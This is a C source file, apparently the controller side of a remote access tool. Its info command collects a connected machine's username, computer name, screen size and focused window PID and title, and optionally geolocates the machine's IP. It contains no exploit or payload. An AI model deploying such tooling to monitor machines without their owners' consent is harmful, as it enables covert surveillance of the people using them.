#include <stdio.h>
#include <stdlib.h>
#include "types.h"
#include "logger.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "geoIP.h"
#include "server.h"

#define COMMAND_INFO_USERNAME 0x10
#define COMMAND_INFO_COMPUTERNAME 0x11
#define COMMAND_INFO_SC_WIDTH 0x12
#define COMMAND_INFO_SC_HEIGHT 0x13
#define COMMAND_INFO_FW_PID 0x14
#define COMMAND_INFO_FW_TITLE 0x15

#define COMMAND_INFO_COUNT 6

int command_Info(void)
{
	if(net_SendCmd((uint8*)" ", 1, COMMANDS_INFO) == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to send!\n");

		return NET_LOST_CONNECTION;
	}

	int i;
	int rv = 0;
	uint8* rmsg;

	for(i = 0; i != COMMAND_INFO_COUNT; i++)
	{
		rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES);

		if(rv == NET_LOST_CONNECTION)
		{
			LOG(LOG_ERR, "Failed to receive!\n");
			free(rmsg);

			return NET_LOST_CONNECTION;

		}else if(rv == NET_TIMED_OUT){
			LOG(LOG_ERR, "Time out!\n");
			free(rmsg);

			return NET_LOST_CONNECTION;
		}

		if(rmsg[1] >= COMMAND_INFO_USERNAME && rmsg[1] <= COMMAND_INFO_FW_TITLE)
		{
			if(rmsg[1] == COMMAND_INFO_USERNAME)
			{
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_INFO, "Username: ");

					if(log_Color)
					{
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
						puts("UNKNOWN");
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
					}else{
						puts("UNKNOWN");
					}
				}else{
					LOG(LOG_INFO, "Username: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_COMPUTERNAME){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_INFO, "Computername: ");
					
					if(log_Color)
					{
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
						puts("UNKNOWN");
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
					}else{
						puts("UNKNOWN");
					}
				}else{
					LOG(LOG_INFO, "Computername: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_SC_WIDTH){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_INFO, "Screen width: ");
					
					if(log_Color)
					{
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
						puts("UNKNOWN");
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
					}else{
						puts("UNKNOWN");
					}
				}else{
					LOG(LOG_INFO, "Screen width: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_SC_HEIGHT){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_INFO, "Screen height: ");
					
					if(log_Color)
					{
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
						puts("UNKNOWN");
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
					}else{
						puts("UNKNOWN");
					}
				}else{
					LOG(LOG_INFO, "Screen height: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_FW_PID){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_INFO, "Focused window pid: ");
					
					if(log_Color)
					{
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
						puts("UNKNOWN");
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
					}else{
						puts("UNKNOWN");
					}
				}else{
					LOG(LOG_INFO, "Focused window pid: %s\n", rmsg + 2);
				}
			}else if(rmsg[1] == COMMAND_INFO_FW_TITLE){
				if(rmsg[0] == COMMANDS_DISAPPROVE)
				{
					LOG(LOG_INFO, "Focused window title: ");
					
					if(log_Color)
					{
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
						puts("UNKNOWN");
						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
					}else{
						puts("UNKNOWN");
					}
				}else{
					LOG(LOG_INFO, "Focused window title: %s\n", rmsg + 2);
				}
			}

			if(net_SendCmd((uint8*)" ", 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
			{
				LOG(LOG_ERR, "Failed to send!\n");
				free(rmsg);

				return NET_LOST_CONNECTION;
			}
		}

		free(rmsg);
	}

	if(geoIP_IsInUse)
	{
		LOG(LOG_INFO, "Geo: ");

		char* country;

		if(geoIP_CheckIP(inet_ntoa(server_ClientAddr.sin_addr), &country) != GEOIP_NO_ERROR)
		{
			if(log_Color)
			{
				LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
				puts("UNKNOWN");
				LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
			}else{
				puts("UNKNOWN");
			}
		}else{
			puts(country);
		}

		free(country);
	}

	return COMMANDS_SUCC;
}